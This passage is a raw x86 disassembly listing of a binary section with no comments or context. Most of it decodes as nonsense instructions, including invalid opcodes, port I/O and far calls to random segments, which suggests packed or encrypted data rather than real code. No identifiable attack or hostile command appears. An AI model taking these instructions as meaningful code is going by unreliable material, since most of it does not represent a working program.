  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	(bad)  
  40fa11:	cmp    eax,0xb50bfe5a
  40fa16:	jle    0x40fa96
  40fa18:	lods   al,BYTE PTR ds:[esi]
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa8f
  40fa1d:	aam    0x7b
  40fa1f:	xchg   edx,eax
  40fa20:	push   ss
  40fa21:	cmp    al,0x2e
  40fa23:	out    dx,eax
  40fa24:	sbb    BYTE PTR [ecx+0x13],0xf0
  40fa28:	adc    ecx,eax
  40fa2a:	push   0xbae11f4d
  40fa2f:	add    al,0xe0
  40fa31:	test   ch,dh
  40fa33:	mov    ds:0x21bbfb55,al
  40fa38:	les    esi,FWORD PTR [ebx+0x3fe61c02]
  40fa3e:	push   eax
  40fa3f:	in     eax,dx
  40fa40:	push   esp
  40fa41:	int3   
  40fa42:	in     eax,0x71
  40fa44:	lea    ebx,[edx-0xf4351c7]
  40fa4a:	and    DWORD PTR [eax+eiz*8-0x3dd595ad],esp
  40fa51:	cmp    BYTE PTR [edx+0x680ce86c],bl
  40fa57:	xor    ecx,DWORD PTR [esi-0x74]
  40fa5a:	xchg   ecx,eax
  40fa5b:	mov    cl,0x5d
  40fa5d:	fdivr  QWORD PTR [esi+0x60]
  40fa60:	repz xchg esi,eax
  40fa62:	pop    ebx
  40fa63:	int3   
  40fa64:	push   edi
  40fa65:	jecxz  0x40fa50
  40fa67:	daa    
  40fa68:	xor    ch,0x68
  40fa6b:	fwait
  40fa6c:	loopne 0x40fa82
  40fa6e:	dec    esp
  40fa6f:	or     BYTE PTR [edx-0x1b6785e6],ch
  40fa75:	and    eax,0x97125ed9
  40fa7a:	pop    esp
  40fa7b:	dec    ecx
  40fa7c:	jno    0x40facb
  40fa7e:	fnsave [esi+0x58821a53]
  40fa84:	pushf  
  40fa85:	ret    0xbae4
  40fa88:	loopne 0x40faf0
  40fa8a:	jg     0x40fa7d
  40fa8c:	and    al,0xa3
  40fa8e:	pushf  
  40fa8f:	inc    eax
  40fa90:	pop    ss
  40fa91:	inc    esi
  40fa92:	pop    ebx
  40fa93:	dec    esi
  40fa94:	les    ebx,FWORD PTR [ebx]
  40fa96:	call   0xe3a1:0xbe7e632
  40fa9d:	sbb    DWORD PTR [edi+0x16],esp
  40faa0:	in     al,0x26
  40faa2:	imul   edi,DWORD PTR [edi],0xf5498341
  40faa8:	ins    BYTE PTR es:[edi],dx
  40faa9:	mov    cl,dl
  40faab:	pop    ebx
  40faac:	mov    ebx,0x98b3f41d
  40fab1:	inc    ebp
  40fab2:	ja     0x40fb11
  40fab4:	dec    edx
  40fab5:	repz lea eax,[ebx]
  40fab8:	fld    QWORD PTR [eax-0x1eeddf6c]
  40fabe:	shl    BYTE PTR [ecx],cl
  40fac0:	iret   
  40fac1:	out    0xed,al
  40fac3:	ins    DWORD PTR es:[edi],dx
  40fac4:	jno    0x40fb44
  40fac6:	or     BYTE PTR [ebp-0x4],bh
  40fac9:	mov    edx,0xb7ce1db1
  40face:	pop    ebx
  40facf:	in     eax,dx
  40fad0:	mov    bh,0xbd
  40fad2:	cwde   
  40fad3:	test   eax,0x2c1457eb
  40fad8:	pop    esi
  40fad9:	jno    0x40fb3d
  40fadb:	pop    eax
  40fadc:	pop    eax
  40fadd:	test   al,0x1f
  40fadf:	or     BYTE PTR [ebx],ah
  40fae1:	imul   edi,ebp,0xffffffbe
  40fae4:	xor    al,0x35
  40fae6:	imul   esi,DWORD PTR [edx-0x4d],0xc3b3bfbc
  40faed:	push   cs
  40faee:	adc    eax,0xeebf92ee
  40faf3:	mov    dh,0xc1
  40faf5:	mov    eax,0x58c6ba7e
  40fafa:	mov    dh,0x93
  40fafc:	mov    ss,WORD PTR [edi-0x67b4d4b4]
  40fb02:	fs call 0x62e9:0x5d8aef7b
  40fb0a:	mov    esp,0xc3b8ce91
  40fb0f:	inc    ebp
  40fb10:	and    esi,DWORD PTR [ebx+0x1b571379]
  40fb16:	adc    eax,0xd18caf7f
  40fb1b:	dec    edx
  40fb1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb1d:	ret    
  40fb1e:	sbb    eax,0x39e547ba
  40fb23:	push   0xffffffef
  40fb25:	bound  esp,QWORD PTR [ebp+0x5e65920e]
  40fb2b:	inc    ebx
  40fb2c:	inc    edx
  40fb2d:	push   ds
  40fb2e:	fnstcw WORD PTR [ecx-0x57bf97fa]
  40fb34:	sub    cl,BYTE PTR [ecx-0x1eaaa1d]
  40fb3a:	scas   al,BYTE PTR es:[edi]
  40fb3b:	and    edi,ecx
  40fb3d:	sub    eax,0x41e77380
  40fb42:	dec    ebp
  40fb43:	push   esp
  40fb44:	mov    ch,ah
  40fb46:	push   cs
  40fb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb48:	dec    BYTE PTR [ecx+0x1e5f5048]
  40fb4e:	push   ecx
  40fb4f:	test   eax,0x39cd0756
  40fb54:	cli    
  40fb55:	and    eax,DWORD PTR [ebx]
  40fb57:	and    al,0x1b
  40fb59:	or     dl,ch
  40fb5b:	xchg   edi,eax
  40fb5c:	sub    al,0xdd
  40fb5e:	xchg   BYTE PTR [ebp-0xed02385],ch
  40fb64:	push   ecx
  40fb65:	adc    BYTE PTR [ebp+0x631ecdaa],bh
  40fb6b:	outs   dx,BYTE PTR ds:[esi]
  40fb6c:	add    DWORD PTR [ebp+eiz*4+0x38d2bbe3],ebp
  40fb73:	test   DWORD PTR [esi],0xed52606e
  40fb79:	push   cs
  40fb7a:	inc    edi
  40fb7b:	ret    
  40fb7c:	mov    eax,ds:0x32086206
  40fb81:	out    dx,al
  40fb82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb83:	lahf   
  40fb84:	or     dh,bh
  40fb86:	jecxz  0x40fbeb
  40fb88:	loopne 0x40fb6d
  40fb8a:	adc    edi,eax
  40fb8c:	mov    ebx,0x8be25901
  40fb91:	mov    ecx,esp
  40fb93:	mov    eax,ds:0x9e6486ae
  40fb98:	out    dx,eax
  40fb99:	(bad)  
  40fb9b:	mov    ds:0x6b76f676,al
  40fba0:	adc    ah,BYTE PTR [ecx-0x3d49c93e]
  40fba6:	mov    bl,al
  40fba8:	inc    esp
  40fba9:	pop    ss
  40fbaa:	pop    ebx
  40fbab:	cli    
  40fbac:	push   ebx
  40fbad:	js     0x40fb76
  40fbaf:	mov    ecx,0x9713c473
  40fbb4:	push   ss
  40fbb5:	mov    ch,BYTE PTR [ecx]
  40fbb7:	mov    ah,dh
  40fbb9:	inc    esp
  40fbba:	and    edi,ecx
  40fbbc:	lods   al,BYTE PTR ds:[esi]
  40fbbd:	addr16 aam 0x67
  40fbc0:	sbb    BYTE PTR [esp+edi*8],cl
  40fbc3:	pop    edi
  40fbc4:	repz mov al,ds:0xecf98052
  40fbca:	pop    esp
  40fbcb:	or     ebx,DWORD PTR ds:0xa3ae9cd7
  40fbd1:	loopne 0x40fb85
  40fbd3:	ds retf 0x8fc1
  40fbd7:	adc    al,0x88
  40fbd9:	sbb    DWORD PTR [ecx+0x50],ebx
  40fbdc:	or     al,0xd9
  40fbde:	(bad)  
  40fbdf:	fdivr  QWORD PTR [esi]
  40fbe1:	int    0x5c
  40fbe3:	add    al,0xb7
  40fbe5:	cmp    al,0xd
  40fbe7:	dec    ecx
  40fbe8:	inc    ecx
  40fbe9:	mov    ebp,0x98c123d3
  40fbee:	pop    ebx
  40fbef:	xchg   ebx,eax
  40fbf0:	fdiv   st(1),st
  40fbf2:	gs jge 0x40fbc5
  40fbf5:	shr    DWORD PTR [edi-0x76ea93fc],cl
  40fbfb:	mov    ah,0x21
  40fbfd:	xchg   esp,eax
  40fbfe:	adc    al,0x9
  40fc00:	sub    DWORD PTR [ecx+0x5],edx
  40fc03:	jl     0x40fc41
  40fc05:	inc    ebp
  40fc06:	mov    cl,BYTE PTR [edi]
  40fc08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc09:	dec    edx
  40fc0a:	arpl   WORD PTR [ebx+0xf],si
  40fc0d:	scas   al,BYTE PTR es:[edi]
  40fc0e:	adc    eax,0x52ab9e9e
  40fc13:	jnp    0x40fc8e
  40fc15:	push   esi
  40fc16:	rol    DWORD PTR [edi-0x79d02e43],1
  40fc1c:	jecxz  0x40fbd5
  40fc1e:	in     al,dx
  40fc1f:	pushf  
  40fc20:	hlt    
  40fc21:	(bad)  [eax+0x36d9192f]
  40fc27:	sbb    DWORD PTR [eax+0x6],edx
  40fc2a:	in     eax,dx
  40fc2b:	jp     0x40fc64
  40fc2d:	ja     0x40fc1e
  40fc2f:	add    BYTE PTR [eax],cl
  40fc31:	inc    esp
  40fc32:	mov    ecx,0x115d5f34
  40fc37:	retf   
  40fc38:	jl     0x40fbba
  40fc3a:	jb     0x40fcb5
  40fc3c:	int    0x4
  40fc3e:	setb   bh
  40fc41:	dec    edi
  40fc42:	sar    BYTE PTR [eax+0x66],0xd6
  40fc46:	inc    esp
  40fc47:	rol    ch,0xd8
  40fc4a:	push   esi
  40fc4b:	mov    al,0x1c
  40fc4d:	int3   
  40fc4e:	fcomp  QWORD PTR [ecx]
  40fc50:	cmc    
  40fc51:	loope  0x40fc6a
  40fc53:	dec    ebx
  40fc54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc55:	fsub   DWORD PTR [eax]
  40fc57:	sbb    esp,DWORD PTR fs:[eax-0x7564d405]
  40fc5e:	add    BYTE PTR [edx+0x51],ah
  40fc61:	xor    bh,bh
  40fc63:	mov    cl,bl
  40fc65:	ja     0x40fca4
  40fc67:	loop   0x40fc4a
  40fc69:	retf   
  40fc6a:	and    DWORD PTR [ebx+0x3f824e3b],eax
  40fc70:	lock ret 0x32f5
  40fc74:	loop   0x40fcf5
  40fc76:	cmp    ebp,esi
  40fc78:	dec    edi
  40fc79:	test   eax,0x28c5de3e
  40fc7e:	repz popa 
  40fc80:	dec    esi
  40fc81:	enter  0xdaf3,0x75
  40fc85:	neg    BYTE PTR [edi]
  40fc87:	fadd   DWORD PTR [ebp+0x26909e89]
  40fc8d:	jno    0x40fc50
  40fc8f:	ins    DWORD PTR es:[edi],dx
  40fc90:	or     eax,0x2bc9322b
  40fc95:	in     al,dx
  40fc96:	mov    al,ds:0x1834eb33
  40fc9b:	imul   esp,DWORD PTR [esi],0xffffffa5
  40fc9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc9f:	mov    ecx,DWORD PTR [ecx+0x1d]
  40fca2:	pop    es
  40fca3:	mov    dl,0xe8
  40fca5:	mov    ?,WORD PTR ds:0xf3943bcc
  40fcab:	pop    ebx
  40fcac:	aam    0x9e
  40fcae:	imul   esi,DWORD PTR [ecx+0x53422fc5],0x25
  40fcb5:	inc    eax
  40fcb6:	dec    ebp
  40fcb7:	test   al,0xc1
  40fcb9:	arpl   WORD PTR [esp+ebp*1-0x1ee189f7],bp
  40fcc0:	pusha  
  40fcc1:	xor    dh,dl
  40fcc3:	dec    edi
  40fcc4:	inc    ebp
  40fcc5:	aad    0xa5
  40fcc7:	stc    
  40fcc8:	call   0xf6380048
  40fccd:	loopne 0x40fcd2
  40fccf:	icebp  
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	rcl    DWORD PTR [esi+eax*2-0x4c4607d8],0x7e
  40fcea:	jle    0x40fc98
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fd29
  40fcf0:	mov    ds:0xcced58bd,al
  40fcf5:	aad    0x2a
  40fcf7:	adc    DWORD PTR [edx-0x49],ebx
  40fcfa:	xor    eax,0xba1b8eec
  40fcff:	fcom   DWORD PTR [ecx-0x70]
  40fd02:	cs xchg edi,eax
  40fd04:	arpl   ax,sp
  40fd06:	pop    ss
  40fd07:	add    al,0x71
  40fd09:	mov    esp,DWORD PTR [ebx-0x3f9786a4]
  40fd0f:	jb     0x40fcfc
  40fd11:	std    
  40fd12:	mov    al,0x3d
  40fd14:	retf   0xc971
  40fd17:	sbb    cl,BYTE PTR [esp-0x28dcbc01]
  40fd1e:	mov    ah,cl
  40fd20:	out    dx,eax
  40fd21:	xchg   DWORD PTR [ebx-0x76],edi
  40fd24:	dec    esi
  40fd26:	(bad)  
  40fd27:	fldcw  WORD PTR [ebx-0x59]
  40fd2a:	jp     0x40fd91
  40fd2c:	push   eax
  40fd2d:	mov    ss,ebx
  40fd2f:	mov    ecx,ds
  40fd31:	cmp    eax,eax
  40fd33:	jbe    0x40fce3
  40fd35:	and    esp,edi
  40fd37:	pop    esp
  40fd38:	in     eax,dx
  40fd39:	(bad)  
  40fd3b:	jmp    0x8c597de7
  40fd40:	jns    0x40fd46
  40fd42:	les    esp,FWORD PTR [ecx]
  40fd44:	aad    0x55
  40fd46:	pop    esi
  40fd47:	stos   BYTE PTR es:[edi],al
  40fd48:	sahf   
  40fd49:	ror    BYTE PTR [edi],cl
  40fd4b:	rcr    BYTE PTR [edx-0x5c051d39],0x66
  40fd52:	lods   al,BYTE PTR fs:[esi]
  40fd54:	jge    0x40fd1d
  40fd56:	mov    ebp,0x389a41ed
  40fd5b:	xor    ch,BYTE PTR [esi]
  40fd5d:	addr16 xor eax,0xb4c36be8
  40fd63:	lods   eax,DWORD PTR ds:[esi]
  40fd64:	jo     0x40fdb3
  40fd66:	push   ss
  40fd67:	repz pop eax
  40fd69:	mov    ah,dl
  40fd6b:	xchg   esp,eax
  40fd6c:	pop    es
  40fd6d:	jbe    0x40fd19
  40fd6f:	jnp    0x40fd1a
  40fd71:	jbe    0x40fdb4
  40fd73:	js     0x40fd10
  40fd75:	ss sbb eax,0xfad770ab
  40fd7b:	loop   0x40fd6d
  40fd7d:	lods   al,BYTE PTR ds:[esi]
  40fd7e:	mov    bh,0x58
  40fd80:	shl    BYTE PTR [ebx-0x16],cl
  40fd83:	adc    DWORD PTR [ebx+0x6bd95fad],edi
  40fd89:	cmc    
  40fd8a:	outs   dx,DWORD PTR ds:[esi]
  40fd8b:	loopne 0x40fd6d
  40fd8d:	mov    eax,0x7d84445b
  40fd92:	neg    BYTE PTR [eax-0x78]
  40fd95:	xchg   esp,eax
  40fd96:	add    cl,BYTE PTR es:[esi]
  40fd99:	dec    esi
  40fd9a:	add    al,0x6a
  40fd9c:	int3   
  40fd9d:	daa    
  40fd9e:	sub    al,0x92
  40fda0:	lock push ds
  40fda2:	push   cs
  40fda3:	loope  0x40fda1
  40fda5:	add    bl,0xc5
  40fda8:	arpl   WORD PTR [eax+0x63],bx
  40fdab:	fmul   st(3),st
  40fdad:	mov    esi,0xed656dc6
  40fdb2:	jl     0x40fe1e
  40fdb4:	mov    DWORD PTR [ebx+0x6f],ebp
  40fdb7:	pop    esp
  40fdb8:	jmp    0x40fd9d
  40fdba:	or     al,0xa7
  40fdbc:	repz adc edi,DWORD PTR [edi+ebp*4]
  40fdc0:	shl    BYTE PTR [eax+0x6e],0x2d
  40fdc4:	mov    ss,WORD PTR [esi+0x483592d8]
  40fdca:	dec    ebp
  40fdcb:	dec    ebx
  40fdcc:	mov    eax,0x826d785
  40fdd1:	or     eax,0xb324453d
  40fdd6:	into   
  40fdd7:	popf   
  40fdd8:	dec    esp
  40fdd9:	jne    0x40fe20
  40fddb:	retf   
  40fddc:	stc    
  40fddd:	or     eax,esi
  40fddf:	mov    al,0xdc
  40fde1:	les    eax,FWORD PTR [edx-0x25]
  40fde4:	je     0x40fdef
  40fde6:	or     BYTE PTR [edx-0x7c],ah
  40fde9:	mov    ds:0xb8651e03,eax
  40fdee:	mov    BYTE PTR [esi-0x6ca265a8],ch
  40fdf4:	shl    DWORD PTR [ebx+edx*1+0x22d16d3b],1
  40fdfb:	adc    esp,DWORD PTR [esi+0x65]
  40fdfe:	fadd   st(5),st
  40fe00:	repz mov eax,DWORD PTR [eax+0x566bf91c]
  40fe07:	jp     0x40fe59
  40fe09:	push   ss
  40fe0a:	inc    ebx
  40fe0b:	mov    bh,ah
  40fe0d:	imul   edx,edi,0xffffffe5
  40fe10:	or     al,0x48
  40fe12:	mov    ah,0x0
  40fe14:	mov    ebx,0x636f9235
  40fe19:	int    0xca
  40fe1b:	push   0xffffffa7
  40fe1d:	js     0x40fe2b
  40fe1f:	xor    al,0x7d
  40fe21:	rol    BYTE PTR [esi+0x446a6f0d],0xf0
  40fe28:	mul    DWORD PTR [eax+0x3e]
  40fe2b:	add    edx,esi
  40fe2d:	(bad)  
  40fe2e:	push   eax
  40fe2f:	idiv   DWORD PTR [ecx-0x4b]
  40fe32:	xchg   DWORD PTR [esi],eax
  40fe34:	cdq    
  40fe35:	jbe    0x40fe07
  40fe37:	mov    ebp,0xdbea4d94
  40fe3c:	xor    DWORD PTR [edx+0xf],esp
  40fe3f:	(bad)  
  40fe40:	ja     0x40fde9
  40fe42:	pop    ecx
  40fe43:	sbb    al,0xbf
  40fe45:	rol    BYTE PTR [esi+ebx*4+0x59a3a67f],cl
  40fe4c:	lds    ebx,FWORD PTR [esp+edx*8-0x57]
  40fe50:	add    eax,0xd2db04be
  40fe55:	sar    DWORD PTR [edi],0xcd
  40fe58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe59:	mov    edx,DWORD PTR [edi-0x6ab0ff79]
  40fe5f:	fs stos DWORD PTR es:[edi],eax
  40fe61:	sub    DWORD PTR [edx-0x73],eax
  40fe64:	xor    ebp,edi
  40fe66:	arpl   WORD PTR [eax+0x4014cbca],cx
  40fe6c:	sbb    edi,DWORD PTR [esi-0x2d2bf2cb]
  40fe72:	dec    ebp
  40fe73:	test   DWORD PTR [edx],edi
  40fe75:	xor    cl,BYTE PTR [edx-0x7ba4ed18]
  40fe7b:	out    dx,al
  40fe7c:	jne    0x40fe4e
  40fe7e:	and    al,0xeb
  40fe80:	in     al,dx
  40fe81:	enter  0xcff8,0x8e
  40fe85:	dec    esp
  40fe86:	addr16 push esi
  40fe88:	push   esi
  40fe89:	mov    ebx,0x2f6e22b5
  40fe8e:	leave  
  40fe8f:	sbb    BYTE PTR [edx+0x13],dl
  40fe92:	or     eax,0x231ee126
  40fe97:	cs shl bp,0xc7
  40fe9c:	in     al,dx
  40fe9d:	fwait
  40fe9e:	mov    edx,DWORD PTR [ebx]
  40fea0:	jb     0x40fe82
  40fea2:	in     al,0x9a
  40fea4:	call   0x7700dc6c
  40fea9:	inc    ecx
  40feaa:	shl    DWORD PTR [ebx+0x14],0xe1
  40feae:	cmc    
  40feaf:	adc    ah,al
  40feb1:	jnp    0x40fe60
  40feb3:	mov    BYTE PTR [edi-0x5a],0x6d
  40feb7:	jae    0x40ff18
  40feb9:	push   ds
  40feba:	push   es
  40febb:	inc    ebp
  40febc:	jg     0x40fe4c
  40febe:	lds    edi,FWORD PTR [esi-0x11d859c9]
  40fec4:	sahf   
  40fec5:	xchg   edx,eax
  40fec6:	adc    BYTE PTR [edi-0x17b4ebe7],0x69
  40fecd:	xor    BYTE PTR [edi-0x6146e8],al
  40fed3:	xchg   esi,eax
  40fed4:	cs retf 
  40fed6:	(bad)  
  40fed7:	(bad)  
  40fed9:	lods   al,BYTE PTR ds:[esi]
  40feda:	push   ds
  40fedb:	addr16 stc 
  40fedd:	mov    al,0x86
  40fedf:	cmp    edx,edi
  40fee1:	dec    edi
  40fee2:	mov    BYTE PTR [edx],bh
  40fee4:	pop    esi
  40fee5:	pop    ecx
  40fee6:	hlt    
  40fee7:	sete   BYTE PTR [ebp-0x2ffe4575]
  40feee:	loop   0x40ff3a
  40fef0:	mov    esi,0x5d81e527
  40fef5:	les    ecx,FWORD PTR [edx+0x50a7f81c]
  40fefb:	outs   dx,DWORD PTR ds:[esi]
  40fefc:	xor    BYTE PTR ds:0x81280e41,0xe7
  40ff03:	repz pop es
  40ff05:	pop    eax
  40ff06:	scas   al,BYTE PTR es:[edi]
  40ff07:	clc    
  40ff08:	dec    edx
  40ff09:	jle    0x40fec9
  40ff0b:	iret   
  40ff0c:	push   ebp
  40ff0d:	das    
  40ff0e:	popf   
  40ff0f:	inc    edx
  40ff10:	xchg   ecx,eax
  40ff11:	push   ebp
  40ff12:	add    edx,DWORD PTR [ebp-0x6ee8e7b6]
  40ff18:	sti    
  40ff19:	(bad)  
  40ff1a:	xor    ch,BYTE PTR [edi-0x58a4bede]
  40ff20:	inc    ecx
  40ff21:	out    0x6b,al
  40ff23:	push   ecx
  40ff24:	cmp    bl,BYTE PTR [eax-0x3c3c615e]
  40ff2a:	pop    ecx
  40ff2b:	inc    edi
  40ff2c:	xchg   edx,eax
  40ff2d:	dec    eax
  40ff2e:	push   es
  40ff2f:	aas    
  40ff30:	push   edi
  40ff31:	push   0xffffffe2
  40ff33:	sti    
  40ff34:	(bad)  
  40ff35:	out    dx,al
  40ff36:	in     al,0x3e
  40ff38:	stos   BYTE PTR es:[edi],al
  40ff39:	or     dl,BYTE PTR [esi+ebx*2]
  40ff3c:	pop    ecx
  40ff3d:	push   edi
  40ff3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff3f:	shr    BYTE PTR [ecx-0x32],1
  40ff42:	es int 0x3c
  40ff45:	adc    dl,BYTE PTR [ecx]
  40ff47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff48:	outs   dx,DWORD PTR ds:[esi]
  40ff49:	dec    edx
  40ff4a:	add    edx,DWORD PTR [eax+0x23]
  40ff4d:	jo     0x40ff94
  40ff4f:	sub    eax,0xa9d601f4
  40ff54:	cli    
  40ff55:	or     DWORD PTR [ebx+0x56],edx
  40ff58:	mov    al,0x0
  40ff5a:	lock cwde 
  40ff5c:	mov    al,0x67
  40ff5e:	out    0x4b,eax
  40ff60:	and    eax,DWORD PTR [eax]
  40ff62:	adc    cl,BYTE PTR ds:0xda8934db
  40ff68:	call   0xed82:0xfb5b29a1
  40ff6f:	test   BYTE PTR [edi+0x27],0xbd
  40ff73:	ret    0x66fd
  40ff76:	dec    ebp
  40ff77:	popf   
  40ff78:	es inc esi
  40ff7a:	das    
  40ff7b:	mov    ds:0x969aa079,eax
  40ff80:	(bad)  
  40ff81:	iret   
  40ff82:	sub    al,0x12
  40ff84:	lea    edx,[eax]
  40ff86:	inc    ebx
  40ff87:	bound  esi,QWORD PTR [ecx+0x334e6295]
  40ff8d:	scas   al,BYTE PTR es:[edi]
  40ff8e:	or     bh,BYTE PTR ds:0x32b039ef
  40ff94:	mov    al,0xe7
  40ff96:	add    al,BYTE PTR [ebx]
  40ff98:	inc    ebx
  40ff99:	push   ebx
  40ff9a:	in     eax,dx
  40ff9b:	or     ecx,eax
  40ff9d:	mov    al,ds:0xff2a20b
  40ffa2:	scas   eax,DWORD PTR es:[edi]
  40ffa3:	(bad)  
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433623,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4336e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0xe5f439b1
  40ffd9:	xchg   edx,eax
  40ffda:	test   eax,0x7e7ebef7
  40ffdf:	lods   al,BYTE PTR ds:[esi]
  40ffe0:	jl     0x410060
  40ffe2:	jle    0x410033
  40ffe4:	add    al,0xc3
  40ffe6:	sbb    eax,DWORD PTR fs:[esi]
  40ffe9:	jmp    0x40ff98
  40ffeb:	or     al,0xc3
  40ffed:	cld    
  40ffee:	push   eax
  40ffef:	add    dh,dl
  40fff1:	stos   BYTE PTR es:[edi],al
  40fff2:	fdivr  st,st(6)
  40fff4:	pop    eax
  40fff5:	lods   eax,DWORD PTR ds:[esi]
  40fff6:	or     edx,eax
  40fff8:	iret   
  40fff9:	frstor [esi]
  40fffc:	retf   
  40fffd:	cmp    eax,0x84a408a5
  410002:	fidivr WORD PTR [edx-0x43]
  410005:	adc    eax,DWORD PTR [edi+esi*4-0x5a]
  410009:	int    0xcd
  41000b:	jmp    0x40ff9d
  41000d:	inc    edx
  41000e:	adc    al,0xc8
  410010:	jmp    0x38959e05
  410015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410016:	xchg   bh,bh
  410018:	push   0x2d525f14
  41001d:	dec    eax
  41001e:	dec    esp
  41001f:	into   
  410020:	call   0x49965153
  410025:	idiv   ebp
  410027:	jnp    0x410062
  410029:	not    DWORD PTR [ecx]
  41002b:	lods   eax,DWORD PTR ds:[esi]
  41002c:	xor    al,0x97
  41002e:	push   ebp
  41002f:	adc    eax,0x79514b02
  410034:	add    edx,DWORD PTR ds:0xeb7819bc
  41003a:	fisttp QWORD PTR [edi-0x6]
  41003d:	ret    
  41003e:	jo     0x40ffe9
  410040:	lds    ecx,FWORD PTR [edi]
  410042:	icebp  
  410043:	sbb    ah,cl
  410045:	ror    DWORD PTR [ebp-0x33],0x74
  410049:	xor    eax,0x91f5fc89
  41004e:	sbb    al,0x5f
  410050:	lds    eax,FWORD PTR [ebx-0x52c09513]
  410056:	add    al,0x7c
  410058:	retf   0x5e79
  41005b:	leave  
  41005c:	push   eax
  41005d:	mov    eax,ds:0x4c346a7
  410062:	test   eax,0x3c664218
  410067:	mov    al,ds:0xfb267e13
  41006c:	mov    ah,0xdd
  41006e:	or     DWORD PTR [ebp+0x57],0x5223f6d2
  410075:	add    DWORD PTR [ebx-0x65f783c2],esi
  41007b:	dec    esp
  41007c:	hlt    
  41007d:	and    eax,0x45e9fef4
  410082:	xor    eax,0xd574150f
  410087:	mov    ah,0x51
  410089:	add    eax,0x6b82b415
  41008e:	jmp    0xb9e205fa
  410093:	push   esp
  410094:	pop    ss
  410095:	call   0xd22ad42
  41009a:	pop    ebp
  41009b:	pop    esi
  41009c:	fwait
  41009d:	push   edx
  41009e:	dec    ebx
  41009f:	(bad)  
  4100a0:	xchg   edx,eax
  4100a1:	psubd  mm4,mm5
  4100a4:	mov    al,0xd9
  4100a6:	inc    ebp
  4100a7:	(bad)  
  4100a8:	fistp  WORD PTR [esi+0x61de4e76]
  4100ae:	or     edi,DWORD PTR [edx]
  4100b0:	sbb    DWORD PTR [eax],esp
  4100b2:	xor    al,0x12
  4100b4:	(bad)  
  4100b5:	jo     0x410118
  4100b7:	cmc    
  4100b8:	ss das 
  4100ba:	stc    
  4100bb:	add    bh,BYTE PTR [edx+0x58]
  4100be:	test   al,0x42
  4100c0:	jo     0x41013e
  4100c2:	ret    
  4100c3:	or     ecx,esp
  4100c5:	test   esp,esp
  4100c7:	cmp    eax,DWORD PTR [ecx-0x40a60e4c]
  4100cd:	int    0x2f
  4100cf:	cdq    
  4100d0:	inc    eax
  4100d1:	pop    edi
  4100d2:	in     al,dx
  4100d3:	ficomp WORD PTR ds:0x3b0a9334
  4100d9:	inc    esi
  4100da:	test   dh,0x7d
  4100dd:	fild   DWORD PTR [ebx]
  4100df:	and    DWORD PTR [esi-0x6568c21e],0xe1cf2958
  4100e9:	jo     0x4100c6
  4100eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100ec:	iret   
  4100ed:	out    0xbb,al
  4100ef:	test   al,0x71
  4100f1:	jo     0x410168
  4100f3:	cmp    cl,cl
  4100f5:	add    al,0xe0
  4100f7:	sbb    BYTE PTR [edx],ah
  4100f9:	and    DWORD PTR [ecx+0x6d],ebp
  4100fc:	stos   DWORD PTR es:[edi],eax
  4100fd:	or     edx,DWORD PTR [ebp+0x4fb2354a]
  410103:	retf   0x6192
  410106:	xor    eax,0x470cc749
  41010b:	mov    ah,0x32
  41010d:	sti    
  41010e:	and    cl,0x16
  410111:	or     eax,0x9c6976e7
  410116:	push   bp
  410118:	shr    ecx,1
  41011a:	sti    
  41011b:	xchg   edx,esi
  41011d:	jno    0x4100ae
  41011f:	pop    esp
  410120:	aas    
  410121:	mov    DWORD PTR [eax+0x26579254],edi
  410127:	mov    edi,eax
  410129:	call   0x4475:0x36a2c76b
  410130:	or     BYTE PTR [edi-0x59],dh
  410133:	pushf  
  410134:	xchg   BYTE PTR [edx-0x20],dl
  410137:	imul   ecx,DWORD PTR [edx],0x71
  41013a:	cwde   
  41013b:	xchg   edi,eax
  41013c:	add    dh,ch
  41013e:	adc    al,0x22
  410140:	dec    esp
  410141:	xor    BYTE PTR [eax+ebx*8],bh
  410144:	pop    ebp
  410145:	sub    eax,0x1c2f03d3
  41014a:	xchg   DWORD PTR [esi+0x38],eax
  41014d:	in     al,dx
  41014e:	pop    esi
  41014f:	mov    ch,0xaa
  410151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410152:	sahf   
  410153:	daa    
  410154:	stos   BYTE PTR es:[edi],al
  410155:	xchg   edx,eax
  410156:	dec    esp
  410157:	test   BYTE PTR [eax],bl
  410159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41015a:	in     al,0xbe
  41015c:	jecxz  0x410134
  41015e:	js     0x410154
  410160:	inc    ebp
  410161:	jb     0x410130
  410163:	add    dh,BYTE PTR ds:0xc7edf045
  410169:	jmp    0x4101e7
  41016b:	stos   DWORD PTR es:[edi],eax
  41016c:	std    
  41016d:	mov    DWORD PTR [edx],edx
  41016f:	lods   al,BYTE PTR ds:[esi]
  410170:	and    bh,BYTE PTR [edx+0x13]
  410173:	sub    BYTE PTR [ebp+0x80f4a02],dh
  410179:	cld    
